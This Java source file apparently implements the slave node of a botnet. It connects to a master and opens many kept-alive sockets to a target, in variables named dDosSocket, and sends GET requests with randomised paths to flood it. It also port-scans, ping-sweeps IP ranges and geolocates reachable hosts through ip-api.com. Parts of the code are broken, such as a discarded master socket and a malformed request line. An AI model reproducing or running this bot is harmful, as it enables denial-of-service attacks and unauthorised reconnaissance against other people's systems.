import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.net.URLConnection;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Random;
import java.util.Scanner;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

public class SlaveBot implements Runnable {
	private int slaveId;
	private String timestamp = "";
	private int port;
	private Socket slaveSocket;
	private String ip;
	static int count = 1;
	int portRangeStart;
	int portRangeEnds;
	String ipStart;
	String ipEnd;
	private String command;
	boolean isGeoLocation = false;
	String range = null;
	String portRange = null;
	ArrayList<Integer> targetPort = new ArrayList<Integer>();
	Socket currentSocket = null;

	public String getPortRange() {
		return portRange;
	}

	public void setPortRange(String portRange) {
		this.portRange = portRange;
	}

	String targetIP;

	public String getTargetIP() {
		return targetIP;
	}

	public void setTargetIP(String targetIP) {
		this.targetIP = targetIP;
	}

	public boolean isGeoLocation() {
		return isGeoLocation;
	}

	public void setGeoLocation(boolean isGeoLocation) {
		this.isGeoLocation = isGeoLocation;
	}

	public String getRange() {
		return range;
	}

	public void setRange(String range) {
		this.range = range;
	}

	static ArrayList<Socket> connectedToRemoteHost = new ArrayList<>();

	static ArrayList<Socket> listSockets = new ArrayList<>();
	static HashMap<String, ArrayList<Socket>> mapSpckets = new HashMap<String, ArrayList<Socket>>();

	public static void main(String[] args) {
		try {
			if (args.length != 0) {
				String tempMasterAddress = args[1];
				int tempPortOfMaster = Integer.parseInt(args[2]);
				SlaveBot s = new SlaveBot(tempPortOfMaster, tempMasterAddress);
				s.connectToMaster(s);
			}
			while (true) {
				Scanner inp = new Scanner(System.in);
				String line = inp.nextLine();
				String[] arrayOfString = line.split("\\s+");
				String serverName = arrayOfString[1];
				int port = Integer.parseInt(arrayOfString[2]);
				SlaveBot slave = new SlaveBot(port, serverName);
				slave.connectToMaster(slave);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public SlaveBot() {

	}

	public SlaveBot(int port, String ip) {
		this.port = port;
		this.ip = ip;
	}

	public void connectToMaster(SlaveBot slave) {
		Date date = new Date();
		try {
			SlaveBot slaveBot = slave;
			Socket temp = slaveBot.getSlaveSocket();
			System.out.println(temp);
			temp = new Socket(slaveBot.getIp(), slaveBot.getPort());
			slaveBot.slaveId = count;
			slaveBot.setTimestamp("" + new SimpleDateFormat("yyyy-mm-dd").format(date));
			count++;
			System.out.println("Connected to " + temp.getRemoteSocketAddress() + " local socket add"
					+ temp.getLocalSocketAddress());
		} catch (IOException e) {
			System.out.println("-1");
		}
	}

	public HashMap<String, ArrayList<Socket>> connectRemoteH(int port, String ip, Socket slave, int noOfConn,
			boolean keepAlive, String url) {
		ArrayList<Socket> lstOfSlaveSocketsStoredInMap = new ArrayList<>();
		try {
			for (int i = 0; i < noOfConn; i++) {
				Socket dDosSocket = new Socket();
				dDosSocket.connect(new InetSocketAddress(ip, port));
				if (dDosSocket.isConnected()) {
					System.out.println("Connected to " + dDosSocket.toString() + " with slave " + slave.toString());
					if (keepAlive) {
						connectedToRemoteHost.add(dDosSocket);
						lstOfSlaveSocketsStoredInMap.add(dDosSocket);
						dDosSocket.setKeepAlive(true);
						System.out.println("keepAlive = true");
					}
					if (url != "" && url != null) {
						DataOutputStream os = new DataOutputStream(dDosSocket.getOutputStream());
						DataInputStream is = new DataInputStream(dDosSocket.getInputStream());
						os.writeBytes("GET " + url + SlaveBot.getRandomString() + "HTTP/1.1\n\nHost: " + ip);
						os.flush();
						System.out.println(is.readLine() + " random string used " + url + SlaveBot.getRandomString());
						is.close();
					}
					listSockets.add(dDosSocket);
					lstOfSlaveSocketsStoredInMap.add(dDosSocket);
					for (String key : mapSpckets.keySet()) {
						if (key.equalsIgnoreCase(slave.getRemoteSocketAddress().toString())) {
							if (mapSpckets.containsValue(lstOfSlaveSocketsStoredInMap) || mapSpckets.get(key) != null) {
								lstOfSlaveSocketsStoredInMap = mapSpckets.get(key);
							} else {
								lstOfSlaveSocketsStoredInMap = new ArrayList<>();
							}
							lstOfSlaveSocketsStoredInMap.add(dDosSocket);
						}
					}
				}
			}
			mapSpckets.put(slave.getRemoteSocketAddress().toString(), lstOfSlaveSocketsStoredInMap);
		} catch (IOException e) {
			e.printStackTrace();
		}
		return mapSpckets;
	}

	public void disconnectRemote(Socket slave) {
		try {
			if (!slave.isClosed() || slave.isConnected()) {
				System.out.println("Disconnecting " + slave.toString());
				slave.close();
			}
		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	public static String getRandomString() {
		Random ran = new Random();
		int top = ran.nextInt(9) + 1;
		char data = ' ';
		String dat = "";

		for (int i = 0; i <= top; i++) {
			data = (char) (ran.nextInt(25) + 97);
			dat = data + dat;
		}
		dat = dat + "2";
		return dat;
	}

	public int getSlaveId() {
		return slaveId;
	}

	public void setSlaveId(int slaveId) {
		this.slaveId = slaveId;
	}

	public int getPort() {
		return port;
	}

	public void setPort(int port) {
		this.port = port;
	}

	public String getIp() {
		return ip;
	}

	public void setIp(String ip) {
		this.ip = ip;
	}

	public Socket getSlaveSocket() {
		return slaveSocket;
	}

	public void setSlaveSocket(Socket slaveSocket) {
		this.slaveSocket = slaveSocket;
	}

	public String getTimestamp() {
		return timestamp;
	}

	public void setTimestamp(String timestamp) {
		this.timestamp = timestamp;
	}

	public static int getCount() {
		return count;
	}

	public static void setCount(int count) {
		SlaveBot.count = count;
	}

	public static ArrayList<Socket> getLstOfSocketsCreatedBySlave() {
		return listSockets;
	}

	public static void setLstOfSocketsCreatedBySlave(ArrayList<Socket> lstOfSocketsCreatedBySlave) {
		SlaveBot.listSockets = lstOfSocketsCreatedBySlave;
	}

	@Override
	public void run() {

		try {
			if (this.getCommand().equalsIgnoreCase("tcpportscan")) {
				portScan(this.ip, this.targetIP, this.portRange);
			} else if (this.getCommand().equalsIgnoreCase("ipscan")) {

				printReachableHosts(this.ip, this.range);
			} else if (this.getCommand().equalsIgnoreCase("geoIpScan")) {
				printReachableGeoLocation(this.ip, this.range);
			}
		} catch (InterruptedException | ExecutionException | IOException e) {

			System.out.println("Time Out has happend no Port is available");

		}

	}

	public void portScan(String ip, String Target_name, String portRange)
			throws InterruptedException, ExecutionException {
		StringBuilder commaSeparatedValue = new StringBuilder();

		String[] portParts = portRange.split("-");

		int first = Integer.parseInt(portParts[0]);
		int last = Integer.parseInt(portParts[1]);

		for (int i = first; i <= last; i++) {
			int Port_value = i;
			boolean abc = PortRange(Target_name, Port_value);

			if (abc) {
				targetPort.add(Port_value);

			}
		}

		for (int j = 0; j < targetPort.size(); j++) {

			commaSeparatedValue.append(targetPort.get(j));

			if (j != targetPort.size() - 1) {
				commaSeparatedValue.append(", ");
			}
		}

		System.out.println(commaSeparatedValue.toString()+" Ports are  Reachable" );
	}

	private boolean PortRange(String Target_name, int Port_value) {
		boolean result = true;
		try {
			Socket socket = new Socket();
			socket.connect(new InetSocketAddress(Target_name, Port_value), 1000);
			socket.close();

		} catch (Exception ex) {
			result = false;
		}
		return (result);

	}

	public Future<ScanResult> portIsOpen(final ExecutorService es, final String ip, final int port, final int timeout) {
		return es.submit(new Callable<ScanResult>() {
			public ScanResult call() {
				try {
					Socket socket = new Socket();
					socket.connect(new InetSocketAddress(ip, port), timeout);
					socket.close();
					return new ScanResult(port, true);
				} catch (Exception ex) {
					return new ScanResult(port, false);
				}
			}
		});
	}

	public static void printReachableHosts(String ipAddress, String range) throws SocketException {

		try {
			ArrayList<String> listOfResponsdedTarget = new ArrayList<String>();
			System.out.println("IP Scan is running in seperate Thread");

			String[] ipRange = range.split("-");
			String[] ipStart = ipRange[0].split("\\.");
			String[] ipEnd = ipRange[1].split("\\.");
			long result1 = 0;
			long result2 = 0;

			for (int i = 0; i < ipStart.length; i++) {
				int power = 3 - i;
				int ip = Integer.parseInt(ipStart[i]);
				result1 += ip * Math.pow(256, power);
			}

			for (int i = 0; i < ipEnd.length; i++) {
				int power = 3 - i;
				int ip = Integer.parseInt(ipEnd[i]);
				result2 += ip * Math.pow(256, power);
			}

			for (long i = result1; i < (result2 + 1); ++i) {
				long new_result1 = i;
				String ipString;
				StringBuilder sb = new StringBuilder(15);
				for (int j = 0; j < 4; j++) {
					sb.insert(0, Long.toString(new_result1 & 0xff));
					if (j < 3) {
						sb.insert(0, '.');
					}
					new_result1 = new_result1 >> 8;
				}
				ipString = sb.toString();
				InetAddress ip = InetAddress.getByName(ipString);
				boolean isWindows = System.getProperty("os.name").toLowerCase().contains("win");
				;
				String pingResult = "";
				String pingCmd = "";
				
				if (isWindows) {
					pingCmd = "ping -n 1 " + ipString;
				} else {
					pingCmd = "ping -c 1 " + ipString;
				}

				try {
				
					Runtime r = Runtime.getRuntime();
					Process p = r.exec(pingCmd);

					BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
					String inputLine;
					while ((inputLine = in.readLine()) != null) {
						pingResult += inputLine;
					}
					in.close();

					if (pingResult.contains("0% packet loss") || pingResult.contains("(0% loss)")) {
						System.out.println(ipString + "  Is Reachable");
					}
				} catch (IOException e) {

				}
			}
		} catch (IOException e) {
		}
	}

	public static void printReachableGeoLocation(String ipAddress, String range) {

		try {
			ArrayList<String> listOfResponsdedTarget = new ArrayList<String>();
			System.out.println("Geo-Ip Scan is running in seperate Thread");

			String[] ipRange = range.split("-");
			String[] ipStart = ipRange[0].split("\\.");
			String[] ipEnd = ipRange[1].split("\\.");
			long result1 = 0;
			long result2 = 0;

			for (int i = 0; i < ipStart.length; i++) {
				int power = 3 - i;
				int ip = Integer.parseInt(ipStart[i]);
				result1 += ip * Math.pow(256, power);
			}

			for (int i = 0; i < ipEnd.length; i++) {
				int power = 3 - i;
				int ip = Integer.parseInt(ipEnd[i]);
				result2 += ip * Math.pow(256, power);
			}

			for (long i = result1; i < (result2 + 1); ++i) {
				long new_result1 = i;
				String ipString;
				StringBuilder sb = new StringBuilder(15);
				for (int j = 0; j < 4; j++) {
					sb.insert(0, Long.toString(new_result1 & 0xff));
					if (j < 3) {
						sb.insert(0, '.');
					}
					new_result1 = new_result1 >> 8;
				}
				ipString = sb.toString();
				InetAddress ip = InetAddress.getByName(ipString);
				boolean isWindows = System.getProperty("os.name").toLowerCase().contains("win");
				;
				String pingResult = "";
				String pingCmd = "";

				if (isWindows) {
					pingCmd = "ping -n 1 " + ipString;
				} else {
					pingCmd = "ping -c 1 " + ipString;
				}

				try {
					Runtime r = Runtime.getRuntime();
					Process p = r.exec(pingCmd);

					BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
					String inputLine;
					while ((inputLine = in.readLine()) != null) {
						pingResult += inputLine;
					}
					in.close();

					if (pingResult.contains("0% packet loss") || pingResult.contains("(0% loss)")) {
						System.out.println(ipString + "  IP Is Reachable");
						System.out.println("Local IP " + ipAddress.toString());
						InetAddress address;
						try {
							address = InetAddress.getByName(ipString);
							System.out.println("Global Ip : " + address.getHostAddress());
							System.out.println(geoipscan(address.getHostAddress().toString()));

						} catch (UnknownHostException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						} catch (IOException e) {
							e.printStackTrace();
						}
					}
				} catch (IOException e) {
					System.out.println(e);
				}
			}
		} catch (IOException e) {
			
		}

	}
	static String geoipscan(String input) {
		String res = new String();
		String url = "http://ip-api.com/line/" + input;
		try {
			URL ip = new URL(url);
			BufferedReader in = new BufferedReader(new InputStreamReader(ip.openConnection().getInputStream()));
			String line;
			int i = 1;
			while ((line = in.readLine()) != null) {
				if (i == 1 && !line.equals("success")) {
					break;
				}
				if (i == 2) {
					res += "Country Name: " + line + "; ";
				}
				if (i == 5) {
					res += "State Name : " + line + "; ";
				}
				if (i == 6) {
					res += "City Name: " + line + "; ";
				}
				if (i == 7) {
					res += "Zip Code: " + line;
					break;
				}
				i++;
			}
			in.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
		return res;
	}

	public static class ScanResult {
		private int port;

		private boolean isOpen;

		public ScanResult(int port, boolean isOpen) {
			super();
			this.port = port;
			this.isOpen = isOpen;
		}

		public int getPort() {
			return port;
		}

		public void setPort(int port) {
			this.port = port;
		}

		public boolean isOpen() {
			return isOpen;
		}

		public void setOpen(boolean isOpen) {
			this.isOpen = isOpen;
		}

	}

	public int getPortRangeStart() {
		return portRangeStart;
	}

	public void setPortRangeStart(int portRangeStart) {
		this.portRangeStart = portRangeStart;
	}

	public int getPortRangeEnds() {
		return portRangeEnds;
	}

	public void setPortRangeEnds(int portRangeEnds) {
		this.portRangeEnds = portRangeEnds;
	}

	public String getCommand() {
		return command;
	}

	public void setCommand(String command) {
		this.command = command;
	}

	public String getIpEnd() {
		return ipEnd;
	}

	public String getIpStart() {
		return ipStart;
	}

	public void setIpStart(String ipStart) {
		this.ipStart = ipStart;
	}

	public void setIpEnd(String ipEnd) {
		this.ipEnd = ipEnd;
	}

}